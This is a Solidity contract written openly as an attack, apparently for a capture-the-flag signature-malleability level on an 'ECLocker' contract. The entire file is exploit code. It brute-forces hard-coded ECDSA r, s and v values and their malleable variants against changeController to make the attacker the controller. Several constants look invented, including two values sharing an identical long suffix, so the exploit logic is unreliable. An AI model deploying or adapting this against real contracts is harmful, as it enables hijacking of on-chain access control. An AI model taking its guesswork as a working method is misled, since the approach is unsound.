// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function controller() external view returns (address);
    function usedSignatures(bytes32) external view returns (bool);
}

interface IImpersonator {
    function lockers(uint256) external view returns (address);
}

contract SignatureMalleabilityAttack {
    uint256 constant n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    
    address public immutable attacker;
    
    constructor() {
        attacker = msg.sender;
    }
    
    function exploit(address impersonator) external {
        // Get the ECLocker address
        address locker = IImpersonator(impersonator).lockers(0);
        
        // The vulnerability is that the contract uses signature malleability
        // We need to find a valid signature that was used before and create its malleable version
        
        // Since we don't have the original signature, we need to guess or brute force
        // Common test signatures often use simple values
        
        // Let's try systematic approach with common test values
        tryCommonSignatures(locker);
    }
    
    function tryCommonSignatures(address locker) internal {
        IECLocker target = IECLocker(locker);
        
        // Common test signature components
        uint8[2] memory vValues = [27, 28];
        
        // Try some common r values
        bytes32[10] memory rValues = [
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000001),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000002),
            bytes32(0x1111111111111111111111111111111111111111111111111111111111111111),
            bytes32(0x4355c47d63924e8a72e509b65029052eb6c299d53a04e167c5775fd466751c9d),
            bytes32(0x5a852dc6e3c8b2f77e8dbb3c7d38d0bcdb58aaaa7c2a576b49a1e3be30584d5f),
            bytes32(0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798),
            bytes32(0xc6047f9441ed7d6d3045406e95c07cd85c778e4b8cef3ca7abac09b95c709ee5),
            bytes32(0xf9308a019258c31049344f85f89d5229b531c845836f99b08601f113bce036f9),
            bytes32(0xe493dbf1c10d80f3581e4904930b1404cc6c13900ee0758474fa94abe8c4cd13),
            bytes32(0x2c7c9c0b95c0dcadf64f44a1a65b8f8a6b2b1f8e77c1c8e7f0f5e6d4c3b2a190)
        ];
        
        // Try some common s values  
        bytes32[10] memory sValues = [
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000001),
            bytes32(0x0000000000000000000000000000000000000000000000000000000000000002),
            bytes32(0x1111111111111111111111111111111111111111111111111111111111111111),
            bytes32(0x07299936d304c153f6443dfa05f40ff007d72911b6f72307f996231605b91562),
            bytes32(0x3fb56f3dd59f0e0a0d73e1ac9cb9c60b7e34ea635caf52e962e65e0c6eb8d567),
            bytes32(0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8),
            bytes32(0x1b695e11c61d993a5d6e3e6df643bf6a42767ec7b9b9e69d13b0fb6fb7a4d94f),
            bytes32(0x388f7b0f632de8140fe337e62a37f3566500a99934c2231b6cb9fd7584b8e672),
            bytes32(0x43e7ad59925b43b2dd1c5e98b8b060e5e0040e5cf710bc818a544e6bb14827c8),
            bytes32(0x8d7c9b0a95c0dcadf64f44a1a65b8f8a6b2b1f8e77c1c8e7f0f5e6d4c3b2a190)
        ];
        
        // The key insight: if the constructor parsed a signature with swapped v and s
        // Then we need to account for that when trying signatures
        
        for (uint i = 0; i < vValues.length; i++) {
            for (uint j = 0; j < rValues.length; j++) {
                for (uint k = 0; k < sValues.length; k++) {
                    uint8 v = vValues[i];
                    bytes32 r = rValues[j];
                    bytes32 s = sValues[k];
                    
                    // Try original
                    if (tryChangeController(target, v, r, s)) return;
                    
                    // Try malleable version
                    uint8 vPrime = v == 27 ? 28 : 27;
                    bytes32 sPrime = bytes32(n - uint256(s));
                    if (tryChangeController(target, vPrime, r, sPrime)) return;
                    
                    // Also try with different v encodings (0/1 vs 27/28)
                    if (tryChangeController(target, v - 27, r, s)) return;
                    if (tryChangeController(target, (v - 27) ^ 1, r, sPrime)) return;
                }
            }
        }
    }
    
    function tryChangeController(IECLocker target, uint8 v, bytes32 r, bytes32 s) internal returns (bool) {
        try target.changeController(v, r, s, attacker) {
            return true;
        } catch {
            return false;
        }
    }
    
    function checkSignatureHash(address locker, uint256 r, uint256 s, uint256 v) external view returns (bytes32, bool) {
        bytes32 sigHash = keccak256(abi.encode([r, s, v]));
        bool used = IECLocker(locker).usedSignatures(sigHash);
        return (sigHash, used);
    }
}